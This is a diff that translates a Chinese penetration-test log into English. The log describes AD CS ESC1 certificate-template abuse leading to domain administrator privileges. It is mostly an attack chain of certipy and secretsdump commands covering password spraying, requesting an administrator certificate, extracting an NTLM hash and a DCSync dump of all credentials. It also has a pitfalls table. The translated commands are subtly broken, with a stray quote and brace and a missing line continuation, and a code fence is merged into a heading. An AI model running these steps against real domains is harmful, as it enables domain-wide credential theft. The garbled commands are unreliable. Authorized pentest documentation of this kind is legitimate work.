@@ -1,63 +1,62 @@
-# [2026-03] AD CS ESC1 证书模板滥用 → 域管权限
+# [2026-03] AD CS ESC1 Certificate Template Abuse → Domain Admin Privileges
 
-## 场景分类
-渗透测试 / AD 攻击
+## Scene Classification
+Penetration Testing / AD Attack
 
-## 目标概述
-通过 AD CS 证书服务的 ESC1 漏洞模板，以普通域用户身份获取域管证书，最终 DCSync 导出全部凭据。
+## Overview of Goals
+Using the ESC1 vulnerability template of AD CS certificate services, obtain a domain administrator certificate as a regular domain user, and ultimately perform DCSync to export all credentials.
 
-## 完整执行链路
+## Complete Execution Chain
 
-1. 获取一个普通域用户凭据（通过密码喷洒）
-2. 使用 certipy 枚举 AD CS 配置
+1. Obtain a regular domain user credential (through password spraying)
+2. Use certipy to enumerate AD CS configurations
    ```bash
-   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
+certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
    ```
-3. 发现 ESC1 漏洞模板（允许任意 SAN、低权限用户可申请）
-4. 以域管身份请求证书
+3. Discovered ESC1 vulnerability template (allows any SAN, low-privilege users to apply)
+4. Request a certificate as a domain administrator
    ```bash
-   certipy req -u user@domain.local -p 'Password123' \
-     -ca CORP-CA -template VulnTemplate \
+   certipy req -u user@domain.local -p 'Password123' 
+     -ca CORP-CA -template VulnTemplate "}
      -upn administrator@domain.local -dc-ip 10.0.0.1
    ```
-5. 使用证书认证获取 NTLM Hash
+5. Use certificate authentication to obtain NTLM Hash
    ```bash
    certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
    ```
-6. DCSync 导出所有凭据
+6. DCSync Export All Credentials
    ```bash
    secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
    ```
 
-## 踩坑记录
+## Pitfall Record
 
-| 问题 | 原因 | 解决方案 | 耗时 |
+| Problem | Cause | Solution | Time Consumed |
 |------|------|---------|------|
-| certipy find 超时 | LDAP 连接被防火墙拦截 | 改用 -ns 参数指定 DNS | 20min |
-| 证书请求被拒绝 | 模板要求 Manager Approval | 换另一个不需要审批的模板 | 10min |
-| auth 失败 KDC_ERR_PADATA | DC 时间不同步 | ntpdate 同步时间后重试 | 5min |
+| certipy find timed out | LDAP connection blocked by firewall | use -ns parameter to specify DNS instead | 20min |
+| Certificate request denied | Template requires Manager Approval | Switch to another template that doesn't require approval | 10min |
+| auth failed KDC_ERR_PADATA | DC time unsynchronized | retry after ntpdate time synchronization | 5min |
 
-## 工具链发现
-- certipy 是 AD CS 攻击的首选工具，比 Certify.exe 更方便（纯 Python，Kali 直接跑）
-- 需要确保 DNS 解析正确，否则 Kerberos 认证会失败
+## Toolchain Discovery
+- Certipy is the preferred tool for AD CS attacks, more convenient than Certify.exe (pure Python, can run directly on Kali)
+- It is necessary to ensure DNS resolution is correct, otherwise Kerberos authentication will fail
 
-## 关键代码/命令
-见上方执行链路。
+## Key Code/Commands
+See the execution link above.
 
-## 可复用的模式/脚本片段
-```bash
-# AD CS 快速检测一条龙
+## Reusable Patterns/Scripts Snippets```bash
+# AD CS Quick Detection One-Stop Service
 certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
 ```
 
-## 对本包的改进建议
-- certipy 已加入 Kali bootstrap manifest ✓
+## Suggestions for Improvement of This Package
+- certipy has been added to the Kali bootstrap manifest ✓
 - routing.md 已有 "Certipy/AD CS" 路由 ✓
 
-## 进化动作
-- [x] 无需更新（已覆盖）
+## Evolution Actions
+- [x] No update needed (already overwritten)
 
-## 环境信息
+## Environmental Information
 - Kali 2026.1, certipy 4.8.2
-- 目标: Windows Server 2022, AD CS 已部署
-- 域功能级别: 2016
+- Target: Windows Server 2022, AD CS has been deployed
+- Domain Functional Level: 2016
